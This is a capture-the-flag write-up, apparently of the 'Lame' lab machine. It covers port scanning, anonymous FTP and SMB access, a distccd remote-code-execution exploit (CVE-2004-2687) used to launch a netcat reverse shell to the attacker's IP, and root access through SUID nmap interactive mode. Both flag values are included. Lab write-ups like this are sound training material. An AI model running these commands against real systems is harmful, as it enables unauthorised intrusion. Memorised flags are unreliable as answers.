The researcher started out with a scan of the host (10.10.10.3) using rustscan^1^
Command: rustscan -a 10.10.10.3

|Status|IP|Port|
| -----|--|----------- |
| Open | 10.10.10.3 | 21 |
| Open | 10.10.10.3 | 22 |
| Open | 10.10.10.3 | 139 |
| Open | 10.10.10.3 | 445 |
| Open | 10.10.10.3 | 3632 |

The researcher then started with testing from the lowest port. 

PORT 21:
Check for access 
Command: ftp 10.10.10.3
Used anonymous : anonymous for (user : passwd)
The researcher was able to gain access but was met with `229 Entering Extended Passive Mode (|||39377|).`
Since I was not able to get any files I moved on to the next port. 

Port 22:
Since I did not have any creds as of yet I skipped this port. 

Port 139/445:
The researcher started by running smbmap to check if any shares had read/write access.
Command: smbmap -u "" -p "" -P 445 -H 10.10.10.3 && smbmap -u "guest" -p "" -P 445 -H 10.10.10.3
The researcher found that the /tmp share had read/write permissions. 
Using SMBClient the researcher was able to access the share. 
Command: smbclient //10.10.10.3/tmp -U "%"
Once in the researcher ran the following commands to get all the folders and files in the share. 
Command: RECURSE ON
Command: PROMPT OFF
Command: mget *

After reviewing the files the researcher did not find anything of interest. 

Port 3632:
After a quick google search for the port the research found some resources at hacktricks^2^
I attempted to use the nmap scan that was found on the page but I was met with an error, so back to google. 
After another quick search I was pointed to a gitrepo with a python script.^3^

USER FLAG:
Using wget I downloaded the file to my local dictory. 
Command: wget https://gist.githubusercontent.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855/raw/261b638bb05d02b67b6ad67fa9cf3c74a73de6c6/distccd_rce_CVE-2004-2687.py 

I was able to test the script by using the whoami command
Command: python2 distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c 'whoami' 
The response returned the user `daemon`

Once I knew the script work the researcher tried using netcat to get a shell. 
On a new konsole tab I started a nc listener.
Command: nc -nlvp 21 (since I know port 21 is open and valid)
Back to my python script I ran. 
Command: python2 distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c 'nc 10.10.16.7 21 -e /bin/bash' 
I was able to get a shell. 

Once in I used a python command to spawn a TTY shell
Command: python -c 'import pty; pty.spawn("/bin/bash")'

From here I searched for the user flag user.txt.
It was found in `daemon@lame:/home/makis`
Flag 36b506059c48b300acee972398784a2e

ROOT FLAG:
From here the researcher uploaded linpeas from their directory to the /tmp folder using SMB.
while logged into SMB/tmp Command: put linpeas.sh

From the shell I ran linpeas
Command: bash linpeas.sh

Combing through the results linpeas did highlight a possible SUID priv esc. 
`-rwsr-xr-x 1 root root 763K Apr  8  2008 /usr/bin/nmap` 
Doing a quick google search I was able to find a blog using nmap for priv esc.^4^

Following this blog I was able to open a nmap interactive shell within my shell.
Command: nmap --interactive 
Command: !whoami
Command: !sh
I was now root on this box. 
`id = uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)`
I then looked for the root flag and it was found in /root
Flag: 40546746352aad1a3957715faedd42fb


REF
1. https://github.com/RustScan/RustScan
2. https://book.hacktricks.xyz/network-services-pentesting/3632-pentesting-distcc
3. https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855
4. https://www.adamcouch.co.uk/linux-privilege-escalation-setuid-nmap/

